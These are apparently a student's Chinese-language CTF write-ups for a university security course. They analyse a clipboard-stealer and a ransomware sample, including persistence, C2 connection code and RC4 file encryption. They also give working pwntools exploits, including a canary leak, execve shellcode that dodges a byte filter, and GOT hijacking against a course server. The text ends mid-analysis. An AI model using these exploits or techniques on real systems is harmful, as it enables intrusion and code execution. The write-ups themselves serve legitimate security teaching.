要比對的key 47 56 F8 BE FD FB A6 FB A7 FF F2 F2 0C 63 33 11 65 2F 18 21 69 63 35 25 2D 2E 2C 21 70 78 17 7A 0F 92 BE 99 54 48 43 35 75 52 48 36 57 34 32 3F 01 01 00 B1 B5 BA BA BA BA BA A7 A7 A8 A8 A8 AB ... 從以上的memory dump出來的結果就知道全部輸入\\x00和要比對的key只有前面48 bytes不一樣，但後面都一樣，而和全部都是\\x10的輸出結果比較發現都是差\\x10(不管正負)，因此我有大膽的想法，這該不會是XOR的操作ㄅ，經過比對果然無誤，所以我只要把要比對的key和全部都是\\x00的結果進行XOR就知道我應該輸入甚麼了\nLab-Clipboard Stealer 1 \u0026ndash; sub_140001C80 # Flag: FLAG{T1547.001}\n解題流程與思路 # 從解析版中開始由上而下可以知道攻擊者的完整意圖\n取得目前執行程式的名稱和名稱長度 取得目前執行該程式的使用者名稱 利用(username_length + filename_length + 100)這個大小取得malloc的空間 利用sprintf，讓該空間儲存C:\\\\Users\\\\{username}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\SecurityUpdateCheck.exe這個字串 複製目前這個檔案到上一個file path 設定新檔案的屬性(備份檔+隱藏檔+系統檔) 根據以上的流程很明顯他要把檔案放到每次開機都一定會執行的資料夾，並且不想讓使用者察覺到該檔案，所有操作都是為了之後或下一次開機的時候仍然能夠持續執行該程式$\\to$Persistent\n從ATT\u0026amp;CK的網站可以看到persistence的子頁面出現autostart其實和目前的狀態最吻合，就看他是用甚麼方法達到該目的，從其中的技巧來看會發現有很多種方法可以達到此效果，例如改變機碼或是改變lsass driver之類的，而我們的技巧被歸類在T1547.001 Att\u0026amp;CK - T1547\nLab-Clipboard Stealer 2 \u0026ndash; sub_140001030 # Flag: FLAG{1480}\n解題流程與思路 # 攻擊者的完整意圖\n設定一個時間(2023/11/18 0:0:0) 開啟一個waitable timer 設定waitable timer為一開始的截止時間 開始等待 根據以上的流程很明顯他是要一直等待直到11/18號那一天才會往下執行，這樣對修課生的壞處是沒辦法交作業，所以對我們來說是一大難處，他必須要符合時間等到11/18這個條件才會開始執行$\\to$Execution Guardrails\n從Att\u0026amp;CK - Defense Evasion Execution Guardrails (T1480)可以看到\nAdversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n常見的條件有: 漏洞、系統語言、時間、Hostname\u0026hellip;\nLab-Clipboard Stealer 3 \u0026ndash; sub_140001C80 # Flag: FLAG{th15_I4_4_mut3x_k1LL_SwitcH}\n解題流程與思路 # 這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照0x64, 0x63, 0x62, 0x7A的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor\nMalware使用Mutex的用途 與一般程式相同，用於跨 process / thread 間的 synchronization 避免重複感染、勒索 (LockBit 3.0、RedLine Stealer) Exploit # f = [0x0E, 0x0A, 0x52, 0x51, 0x25, 0x2B, 0x57, 0x3B, 0x4E, 0x3D, 0x0E, 0x11, 0x0E, 0x51, 0x1B, 0x3B, 0x11, 0x53, 0x2F, 0x28, 0x25, 0x31, 0x14, 0x0D, 0x0E, 0x01, 0x2B, 0x64] # v3 = [0x64, 0x63, 0x62, 0x7A] key = [0X7A, 0X62, 0X63, 0X64] Name = [] for i in range(len(f)): Name.append(chr(key[i % 4] ^ f[i])) print(\u0026#34;Flag: FLAG{\u0026#34; + \u0026#34;\u0026#34;.join(Name) + \u0026#34;}\u0026#34;) Lab-Clipboard Stealer 4 \u0026ndash; sub_140001C80 # Flag: FLAG{462fe0007f86957f59824e113f78947c}\n解題流程與思路 # 進到sub_140001BF0之後可以先觀察sub_140001870，前面有source code可以看到他正在比對byte_140005040的前面兩個字元是不是等於MZ，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中 :::info 如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把byte_140005040改變他的type，變成char[72770]，再用Shift+E，把raw data export出來，丟到online md5 checksum，就可以得到這支檔案的hash(462fe0007f86957f59824e113f78947c) ::: Lab-Clipboard Stealer 5 \u0026ndash; sub_140001C80 # Flag: FLAG{C2_cU540m_Pr0t0C01}\n解題流程與思路 # connet_to_c2 目標是取得c2 server的IP和port number\n先看到#12的socket function，他代表的意思是利用IPv4並且TCP的protocol進行溝通，相關的數值說明都在MSDN，可以用前面教到的用m指令改變已知的constant名稱$\\to$v2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 接著看到connect function中的\u0026amp;name，IDA原本解析成sockaddr，sockaddr是一種通用的結構格式，所以IDA解析出來的東西也沒有問題，不過如果是IPv4又是乙太網路的傳輸，會比較建議把結構改成==sockaddr_in==，這一篇探討了兩者的區別(其實就只是把sockaddr原本的結構擴展而已)，這樣的話整體分析會更好 :::spoiler 解析後 void __fastcall connect_to_c2(unsigned __int64 *a1) { unsigned __int64 v2; // rax struct sockaddr_in name; // [rsp+20h] [rbp-1B8h] BYREF struct WSAData WSAData; // [rsp+30h] [rbp-1A8h] BYREF if ( !WSAStartup(0x202u, \u0026amp;WSAData) ) { name.sin_addr.S_un.S_addr = 0xA0AA8C0; // IP: 192.168.10.10 name.sin_port = htons(11187u); // Port No.: 11187 name.sin_family = AF_INET; v2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); *a1 = v2; connect(v2, \u0026amp;name, 16); } } ::: :::info IP: 0xA0AA8C0 $\\to$ 192.168.10.10(little endian轉十進位) Port: 11187 sin.family: IPv4 Protocol: TCP ::: send_collected_data_to_c2\n先切分程式碼的功能 有時候通靈不一定很準，所以要適時的回頭檢查自己的猜測 前四行初始化的階段(malloc 0x4c然後塞三個dword)，應該是作者自定義的結構，可以利用Structures，自定義一個新的結構，大小就是0x4C，然後前三個可以定義為dd，並且把v4的結構改成packet(按Y) 各種rename field_0看起來像是一個magic bytes，因為一開始附值之後，傳送過去server，再接收回來的packet也是有做驗證的動作，所以看起來是一個verification magic field_8看起來就是接收來自server下達的command field_C就比較多元，在case 1的時候是當作承接server給的encryption key(大小是8個bytes)，但在case 2是當作加密的cipher(大小是0x18個bytes)，所以我取名enc_key_or_data，另外大小是0x18(可以從memcpy的大小看出來)，所以可以按Y改變型別成char[0x18] :::info 目前整體的流程 ::: 分析pcap 這一部就直接對照著講義上截圖或是剛剛分析的封包格式就可以知道哪一個是key哪一個是cipher Key: f0 c7 d3 0e 7f 2c 15 ba Cipher: 43 60 5b 5f 4e ba 9f 9e e3 78 6f 55 cb 81 24 fa e7 bf 0d 1b 3c 24 b7 4e 接下來就可以直接用cipherchef的線上功能decrypt其中的內容 Lab-Clipboard Stealer 6 \u0026ndash; sub_140001C80 # Flag: FLAG{MessageBoxA}\n解題流程與思路 # 在my_start函數中\n#5的for-loop就是找 exported_next-stage.dll 的檔案起點 #7到後面的for-llop結束就是取得 PEB 並遍歷 _LDR_DATA_TABLE_ENTRY 基本上經過解析之後就會非常清楚這一段在做的事情就是和上面的攻擊手法一模一樣，接下來當找到想要的dll之後就會開始找想要的API，以目前的例子來說，攻擊者主要想要找==kernel32.dll==, ==msvcrt.dll==和==user32.dll== 找API的過程和想像中不一樣，他不是直接明文去找，而是把目前爬到的API name做自定義的hash之後再去比對，如果對了就放到變數中 以上，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道__ROL4__的意思，根據x86 and amd64 instruction reference\nThe rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.\n所以很明顯的，這一段就是把hash左移11次，然後加上1187和api_name的字元\napi_name = dll_base + name_array[k]; hash = 0; do hash += __ROL4__(hash, 11) + 1187 + *api_name++;// do self-defined hash function while ( *api_name ); Lab-Scramble # Flag: FLAG{scramble_and_using_solver_to_solve_it}\n解題流程與思路 # 這一題先看source code會發現他做了一連串的scramble動作，包含加減和移位，而次數也不一定，他主要是針對flag中的每一個字元都做1~6次不等的操作，可能是加也可能是減甚至是移位，不過題目也有給我們這些pattern所以應該是可以直接透過這些pattern進行還原，但我們可以用z3下一大堆constraint就可以不用那麼麻煩了\nz3的大致步驟:\n建立一個solver 建立符號 - 以此lab來說就是建立43個符號對應每一個flag字元 加上constraint - 以此lab來說每一個flag字元都應該限制在空白到0x7f之間，另外還要加上每一個符號(就是flag字元)，經過我們已知的scramble pattern之後應該要是最後的target 判斷有無解，如果有的話就把每一個符號的值取出來 Lab-Super Angry # Flag: FLAG{knowing_how_2_angr!}\n解題流程與思路 # 可以從IDA解析出來的結果得知，這支程式的主要流程是我們執行的時候command多帶一個參數，而這個參數會直接進到scramble_fn做一些操作，最後會再跟verify_key進行memcmp，大略分析一下scramble_fn後發先他是一個偏簡單但我們懶得看得操作，所以可以試看看用angr解看看\nangr基本流程:\n建立一個project 建立claripy symbol - 以這個lab的例子來說就是建立我們輸入進去的程式的input string 建立初始的state - 以這個lab來說就是我們一開始輸入的input string 有了proj / symbol / initial state之後就要開始讓他跑起來 Lab-Unpackme # Flag: FLAG{just_4_simple_unpackme_challenge!}\n解題流程與思路 # 這一題一開始就知道是UPX加殼，但是直接試了upx幫忙decompress，卻遇到error，代表可能有一些問題(在Unix環境底下?)，所以我嘗試使用手動脫殼，去分析其中的內容\n首先可以先靜態看一下脫完殼之前是在哪邊跳轉，經過實測和判斷，應該是:\nLOAD:0000000000005AF5 jmp r13 :::info 如何在動態取得這一行的位置呢?手動算出rebase address\n首先先用靜態分析看starti的時候的offset 開始動態執行程式 把目前指到的address拿去和靜態分析拿到的offset相減 (optional)可以用vmmap確認一下 再把我們想要得知的那一行的offset加回來 一開始的offset是0x5888\ngef➤ starti gef➤ x/x 0x7ffff7ffd888-0x5888 0x7ffff7ff8000: 0x7f gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00007ffff7ff2000 0x00007ffff7ff6000 0x0000000000000000 r-- [vvar] 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 r-x [vdso] 0x00007ffff7ff8000 0x00007ffff7ff9000 0x0000000000000000 rw- /mnt/d/NTU/Second Year/Computer Security/Reverse/Lab3/Unpackme/unpackme 0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 rw- 0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x /mnt/d/NTU/Second Year/Computer Security/Reverse/Lab3/Unpackme/unpackme 0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack] gef➤ x/10i 0x7ffff7ff8000+0x5AF5 0x7ffff7ffdaf5: jmp r13 0x7ffff7ffdaf8: pop rbp 0x7ffff7ffdaf9: call 0x7ffff7ffda7c 0x7ffff7ffdafe: (bad) 0x7ffff7ffdaff: jo 0x7ffff7ffdb73 0x7ffff7ffdb01: outs dx,DWORD PTR ds:[rsi] 0x7ffff7ffdb02: movsxd ebp,DWORD PTR [rdi] 0x7ffff7ffdb04: jae 0x7ffff7ffdb6b 0x7ffff7ffdb06: ins BYTE PTR es:[rdi],dx 0x7ffff7ffdb07: data16 (bad) :::\n利用動態看r13的address會跳去哪邊$\\to$0x00007ffff7ff1000\n接下來我找不太到分析的地方，所以就直接c(continue)到user input的地方停下來，再看vmmap :::spoiler vmmap\n[ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00007ffff7d84000 0x00007ffff7d87000 0x0000000000000000 rw- 0x00007ffff7d87000 0x00007ffff7daf000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7daf000 0x00007ffff7f44000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7f44000 0x00007ffff7f9c000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7f9c000 0x00007ffff7fa0000 0x0000000000214000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7fa0000 0x00007ffff7fa2000 0x0000000000218000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6 0x00007ffff7fa2000 0x00007ffff7faf000 0x0000000000000000 rw- 0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000000000 rw- 0x00007ffff7fb5000 0x00007ffff7fb7000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fb7000 0x00007ffff7fe1000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fe1000 0x00007ffff7fec000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fec000 0x00007ffff7fed000 0x0000000000000000 --- 0x00007ffff7fed000 0x00007ffff7fef000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7fef000 0x00007ffff7ff1000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x00007ffff7ff2000 0x00007ffff7ff6000 0x0000000000000000 r-- [vvar] 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 r-x [vdso] 0x00007ffff7ff8000 0x00007ffff7ff9000 0x0000000000000000 r-- 0x00007ffff7ff9000 0x00007ffff7ffa000 0x0000000000000000 r-x 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-- 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000000000 rw- 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 r-- /mnt/d/NTU/Second Year/Computer Security/Reverse/Lab3/Unpackme/unpackme 0x00007ffff7fff000 0x00007ffff8020000 0x0000000000000000 rw- [heap] 0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack] ::: 可以看到0x00007ffff7ff8000開始會有ELF的字樣，代表應該是他脫殼完的結果，我的作法是直接把0x00007ffff7ff8000~0x00007ffff7ffd000全部dump下來進行分析\ngef➤ x/s 0x00007ffff7ff8000 0x7ffff7ff8000: \u0026#34;\\177ELF\\002\\001\\001\u0026#34; gef➤ dump memory real_file 0x00007ffff7ff8000 0x00007ffff7ffd000 開始分析real_file，先用靜態看一下(如source code所示) 找到我們要停的地方的offset$\\to$0x1213\ngef➤ x/10i 0x00007ffff7ff8000+0x1213 0x7ffff7ff9213: mov rcx,QWORD PTR [rip+0x2dfe] # 0x7ffff7ffc018 0x7ffff7ff921a: lea rax,[rbp-0x50] 0x7ffff7ff921e: mov edx,0xa 0x7ffff7ff9223: mov rsi,rcx 0x7ffff7ff9226: mov rdi,rax =\u0026gt; 0x7ffff7ff9229: call 0x7ffff7ff90c0 0x7ffff7ff922e: test eax,eax 0x7ffff7ff9230: je 0x7ffff7ff924b 0x7ffff7ff9232: lea rax,[rip+0xe13] # 0x7ffff7ffa04c 0x7ffff7ff9239: mov rdi,rax 可以看到解析出來的assembly和IDA的差不多，代表我們找對地方\n設定breakpoint後continue就可以在stack中看到key\ngef➤ b *(0x00007ffff7ff9000+0x229) Breakpoint 1 at 0x7ffff7ff9229 gef➤ c Continuing. adjfl Breakpoint 1, 0x00007ffff7ff9229 in ?? () 0x7ffff7ff90c0 ( $rdi = 0x00007fffffffd6c0 → 0x0000006c666a6461 (\u0026#34;adjfl\u0026#34;?), $rsi = 0x00007ffff7ffa030 → \u0026#34;just_a_key\u0026#34;, $rdx = 0x000000000000000a, $rcx = 0x00007ffff7ffa030 → \u0026#34;just_a_key\u0026#34; ) HW-Baby Ransom 1 # Flag: FLAG{e6b77096375bcff4c8bc765e599fbbc0}\n解題流程與思路 # 這一題很難的地方在於很多東西都是runtime才決定的，包含embedded pe file，或者是一些function pointer，所以只能慢慢跟著動態去猜他的行為\nmain function中可以直接看到下面一點的地方，上面只是一些初始化，不用管他，真正在import embedded payload或是進行攻擊的地方在下面的NetworkConfig_1DBB\n說是network config其實和網路操作沒啥屁毛關係，只是前期分析的時候看到有InternetOpen相關的API就先這樣寫，再加上他給了一個https開頭的strings，但看了一圈其實只是scramble過後的payload再加上https，所以其實也和連線沒關係。簡單說一下這一段，詳細可以看一下前面MSDN的background，InternetOpenUrlA中帶的0x84000000，我看csdn分析WannaCry的文章表示，是INTERNET_FLAG_RELOAD + INTERNET_FLAG_NO_CACHE_WRITE的結果，也就是從server端拉資料下來，然後不會把結果存到cache中，但這一切我認為都是為了混淆reverse的人，因為InternetOpenUrl會對給予的szUrl進行連線，有成功的話才會進到if-statement，但他遠永不會成功，因為仔細看szUrl其實是http://M17H+G+4FzeJ69F5.*f)vfquhvnv)*fwdhud)*vf)lpktud)*lj)4)*uk)',27h,'Lpfwjvjcu)Rpkejrv)Tyehu'，所以直接分析下面的部分就好\n進到part 1的地方先看到一個for loop，那個就是在還原scramble url的部分，還原的結果是Microsoft Update，接著下面會把path combine在一起，並且創一個folder，並設定屬性為FILE_ATTRIBUTE_ARCHIVE + FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN，所以必須把file explorer的隱藏系統檔案的選項取消，才看得到 接著下面的nested if statement有點迷，基本上第一次執行一定會直接進到最後的else，因為基本上lpFilename剛創好空間，本身應該沒東西，所以MoveFile當然不會成功，接著就進到最後的ImportantPart了\n持續跟進會先進到NextStatePayload，這一段有個小地方可以注意，也就是(unsigned int)off_140007088()，這是個function pointer，主要做的事情就是isDebuggerPresent，所以如果有使用x64dbg的話要記得開Scylla Hide的Anti Anti Debugger，這樣才會進到if statement去取得embedded pe file(雖然就算不設定，第二個判斷式也應該會是true才對) 終於進到最關鍵的部分了，首先一開始遇到的function其實就是在還原embedded pe file，主要的操作是先取得resource$\\to$00007ff7f219b048 再藉由LoadResource取得真正的resource$\\to$00007ff7f219b058 然後取得該resource的大小$\\to$0x1ca00\n最重要的部分就是每兩個byte都進行XOR 0x8711的動作，直到0x1ca00都做完，這一部分就是解密embedded pe file，解密完可以很明顯看到MD這個magic signature 因此只要利用Scylla把這一部分的memory dump出來再拿去md5 file取得hash就可以了 HW-Baby Ransom 2 # Flag: FLAG{50_y0u_p4y_7h3_r4n50m?!hmmmmm}\n解題流程與思路 # 這一題只要慢慢分析其實很簡單，也有很多是上課就有教到的地方，一樣從上到下(source code)\n首先，如果直接執行這個程式的話，過沒多久會跳出一個視窗，其他部分\u0026quot;好像\u0026quot;沒有甚麼特別攻擊的行為，從WinMain中可以大略知曉這些事情，也就是攻擊者事先決定好一個通知的視窗(就是要叫你付錢的視窗)的一些設定(包含顏色、字形、字體等等)，接著就進到MainPayload搞事 首先他先load msvcrt.dll和wininet.dll這兩個library，再用上課教的==Dynamic API Resolution==，把原本process上的kernel32.dll, msvcrt.dll和user32.dll也一併load到該thread，接著就進到==DoSomethingBad==這邊 從上到下就做幾件事情 創一個名叫Microsoft Update Backup的folder 進行網路連線 試圖連線https://shouldhavecat.com/robots.txt這個網站 如果連線成功就讀取該網站的內容 Load進SystemFunction032這個library$\\to$非常重要 找目前目錄的第一個檔案(不限檔案類型) 進到Create_Read_File 創一個file，名字和之前取得的檔案名稱一樣(假設爬到的file名稱是flag.txt，那新的file也是一樣的名字) malloc一個大小為該檔案大小的空間(假設flag.txt的大小是0x11，malloc的空間就是0x11) 讀flag.txt到這個malloc空間 進到sprintf_copyFile，就是把./flag.txt複製到./Microsoft Update Backup/flag.txt中 進到Create_Write_Delete_File，這是最重要的部分 計算RC4加密需要的key，這個就是從一開始從https://shouldhavecat.com/robots.txt讀取下來的內容中擷取一段8個bytes當作key 利用SystemFunction032把我們的檔案加密 創一個enc_flag.txt這個檔案然後把加密的cipher寫進去 加密的部分 從SystemFunction033這個網站可以知道SystemFunction033一開始的結構，我們可以順著這個結構去推敲解密需要的key struct ustring { DWORD Length; DWORD MaximumLength; PUCHAR Buffer; } _data, key; typedef NTSTATUS(WINAPI* _SystemFunction033)( struct ustring* memoryRegion, struct ustring* keyPointer ); 執行這行之前，跟一下他的資料結構，首先前4 bytes是代表大小，後4 bytes代表maximum length，後8 bytes代表該資料的pointer 第一個parameter就是要加密的檔案，大小就是0x11，儲存在0x214E5567710，所以要加密的明文是FLAG{test_134567} 第二個parameter就是加密所需要的key，大小是0x8，位置是0x324E556613F，所以加密所需的key是==2F 37 32 38 33 33 31 33== 既然已經知道所有的流程就直接使用線上工具解密即可 HW-Evil FlagChecker # Flag: FLAG{jmp1ng_a1l_ar0und}\n解題流程與思路 # 首先，先用ida看主要的流程，會發現有很多jmp系列的位址都跑掉了，此時就要修復，就是data(d)和code( c)之間交錯使用，並且把那些奇怪的data byte換成nop，修把patch好的部分，就會呈現上面的source code這樣\n一樣由上而下，首先會先進到sleep睡眠兩分鐘，並且判斷進到下一行的時候，時間是否在範圍內，這也是time based的anti debugging手法，這部分可以動態直接patch掉 :::spoiler Patch Sleep Function Result ::: 接著會進到loc_401AE0，這部分應該是一個function但不知道為甚麼IDA翻譯不出來，不過看了一下source code也是蠻簡單的，就是一直跳到==sub_401220==，這個在動態也可以patch :::spoiler Patch Anti-Debug Result ::: ==sub_401220==主要是在其他anti debug的部分，具體怎麼做不是很清楚，只知道大概是和exception handler有關係，不過我在開了scylla hide之後沒有出現甚麼特別的事情 接著會進到==sub_401170==，這一段蠻重要的，就是處理一些Exception Handler的事情，然後莫名其妙的會進到0x40120F中的==InputFlag_Check==，中間的一些操作可能是被scylla hide擋掉了，不過中間也確實有檢察==IsDebuggerPresent==這東西 到了這邊就可以大膽猜測一些常見的操作，諸如scanf或是printf的function，接著我們會進到check這個function，也就是實際把我們的輸入，進行cipher操作後和內部的data bytes進行對比的過程 所以到了這邊一切都很明瞭了，主要的code如下 iv = 0xE0C92EAB; memset(output, 0, 0x400u); block = 0; if ( len ) { mem_addr_gap = input - output; // v5代表我們輸入的flag的位址和他memset的位址的差距，從這支檔案為例就是0x418 mem_addr_gap_cp = input - output; do { cipher = iv ^ output[block + mem_addr_gap]; output[block] = cipher; iv = len + (cipher ^ __ROR4__(iv, 3)) - block; Sleep(1000u); printf(dot, new_line); mem_addr_gap = mem_addr_gap_cp; ++block; } while ( block \u0026lt; len ); } 其中，output[block + mem_addr_gap]其實就是我們的input，所以exploit的邏輯就是用brute force，把所有可能都丟一遍，然後嘗試去對比有沒有和built-in cipher bytes一樣，BTW，len代表我們輸入的長度，合理猜測和built-in cipher bytes的長度一樣，也就是23個char，中間的sleep在動態也可以patch掉，就看自己方便 :::danger 在寫ROR的實作時有一個非常重要的重點要注意，也就是最後一個右旋的bit如果是0，在下一次右旋時會被忽略，也就是那個bit會消失，被當成0x的一部分，舉例來說，0x111001，右旋兩次後變成0x011110，但是最左邊的0會被當成0x的一部分，所以下一次再右旋兩次的結果會變成0x10111而不是0x100111，所以我的作法是在每次右旋之前都檢查bit length是不是都是32 bits，如果有少就padding 0在最左邊 ::: "},{"id":186,"href":"/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/","title":"NTU CS 2023 HW3 Write Up","section":"Securities","content":" NTU CS 2023 HW3 Write Up # Lab-Stackoverflow # Flag: flag{Y0u_know_hoW2L3@k_canAry}\n解題流程與思路 # 這一題就是前一年的Leak Canary的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:\n接收開shell的function的address(win function) 接收0x20個bytes，分別代表RSP value/Stack Canary/RBP value/RIP 傳送payload過去，分別是p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) 這樣就可以蓋到RIP後又不會被偵測到canary被改變，return之後拿到shell :::info 比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中\u0026lt;do_system+115\u0026gt; movaps XMMWORD PTR [rsp], xmm1，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV 解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題 :::\nExploit - Leak Canary + Control RIP # from pwn import * # r = process(\u0026#39;./lab\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10041) r.recvuntil(b\u0026#39;Gift: 0x\u0026#39;) win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9) r.recvuntil(b\u0026#39;Gift2: \u0026#39;) rsp_val = u64(r.recv(0x8)) stack_canary = u64(r.recv(0x8)) rbp_val = u64(r.recv(0x8)) rip = u64(r.recv(0x8)) log.info(f\u0026#39;win address = {hex(win_addr)}\u0026#39;) log.info(f\u0026#39;RSP value = {hex(rsp_val)}\u0026#39;) log.info(f\u0026#39;Stack Canary = {hex(stack_canary)}\u0026#39;) log.info(f\u0026#39;RBP value = {hex(rbp_val)}\u0026#39;) log.info(f\u0026#39;RIP value = {hex(rip)}\u0026#39;) payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) log.info(f\u0026#39;Payload = {payload}\u0026#39;) # raw_input() r.sendline(payload) r.interactive() Lab-Shellcode # Flag: flag{How_you_do0o0o0o_sysca1111111}\n解題流程與思路 # 這一題其實和pico-filtered shellcode有點像，主要就是開個RWX權限的空間，最後跳過去執行寫的shellcode，並且在跳過去之前會檢查一些東西，像這一題就是檢查有沒有0x0f或0x05的byte，如果有就填成0，可以觀察一下寫成shellcode過後的hex到底長怎麼樣\n\u0026gt;\u0026gt;\u0026gt; disasm(asm(\u0026#39;\u0026#39;\u0026#39; mov rax, 0x68732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall \u0026#39;\u0026#39;\u0026#39;)) 0: 48 b8 2f 62 69 6e 2f 73 68 00 movabs rax, 0x68732f6e69622f a: 50 push rax b: 48 89 e7 mov rdi, rsp e: 48 31 f6 xor rsi, rsi 11: 48 31 d2 xor rdx, rdx 14: 48 c7 c0 3b 00 00 00 mov rax, 0x3b 1b: 0f 05 syscall\u0026#39; 可以看到0f 05就是syscall的op code，也就是說，如果按照最簡單的shellcode送過去到最後會沒有syscall去呼叫execve，所以我們要用一些方式去bypass這個filter，例如可以先像TA上課說的，把0x0e04放到register後透過加減自行還原出0x0f05這東西，再把他放到對應的address就可以了\nExploit # from pwn import * # r = process(\u0026#39;./lab\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10042) context.arch = \u0026#39;amd64\u0026#39; # payload = asm(\u0026#39;\u0026#39;\u0026#39; # mov rax, 0x68732f6e69622f # push rax # mov rdi, rsp # xor rsi, rsi # xor rdx, rdx # mov rax, 0x3b # mov rcx, 0x040e # add rcx, 0x0101 # mov qword [rip-0x8], rcx # \u0026#39;\u0026#39;\u0026#39;) payload = b\u0026#39;H\\xb8/bin/sh\\x00PH\\x89\\xe7H1\\xf6H1\\xd2H\\xc7\\xc0;\\x00\\x00\\x00H\\xc7\\xc1\\x0e\\x04\\x00\\x00H\\x81\\xc1\\x01\\x01\\x00\\x00H\\x89\\r\\x00\\x00\\x00\\x00\u0026#39; raw_input() r.sendline(payload) r.interactive() Lab-Got # Flag: flag{Libccccccccccccccccccccccccccc}\n解題流程與思路 # 這一題就和0x06(GOT hijacking)差不多，首先有幾個條件才能達到這個攻擊\n要hijack的function在完成hijack之後當然還要再呼叫一次，這樣才會真的執行攻擊 保護不能是Full RELRO，這樣才會執行lazy binding的機制 這一題都有達成，首先題目開一個array，我們可以輸入array的index，題目會return該index的value到前端，而題目並沒有針對我的輸入進行filter或檢查，所以我可以到任意讀取，並且可以針對該index達到任意寫入(因為題目有開這樣的功能)，所以我們就可以先到處看一下輸入不同的index會吐出甚麼樣的東西\n首先要知道arr在哪邊 可以看到他應該在offset 0x4048的地方 gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /mnt/d/NTU/Second Year/Computer Security/PWN/Lab1/got/share/lab ... 0x555555558048 \u0026lt;arr\u0026gt;: 0x00000000000004d2 0x00007ffff7fa2780 0x555555558058: 0x0000000000000000 0x00007ffff7fa1aa0 0x555555558068 \u0026lt;completed.0\u0026gt;: 0x0000000000000000 0x0000000000000000 0x555555558078: 0x0000000000000000 0x0000000000000000 0x555555558088: 0x0000000000000000 0x0000000000000000 gef➤ x/10gx 0x0000555555554000+0x4048-0x30 0x555555558018 \u0026lt;__stack_chk_fail@got.plt\u0026gt;: 0x0000555555555030 0x00007ffff7de8770 0x555555558028 \u0026lt;setvbuf@got.plt\u0026gt;: 0x00007ffff7e09670 0x0000555555555060 0x555555558038: 0x0000000000000000 0x0000555555558040 0x555555558048 \u0026lt;arr\u0026gt;: 0x00000000000004d2 0x00007ffff7fa2780 0x555555558058: 0x0000000000000000 0x00007ffff7fa1aa0 gef➤ got GOT protection: Partial RelRO | GOT functions: 4 [0x555555558018] __stack_chk_fail@GLIBC_2.4 → 0x555555555030 [0x555555558020] printf@GLIBC_2.2.5 → 0x7ffff7de8770 [0x555555558028] setvbuf@GLIBC_2.2.5 → 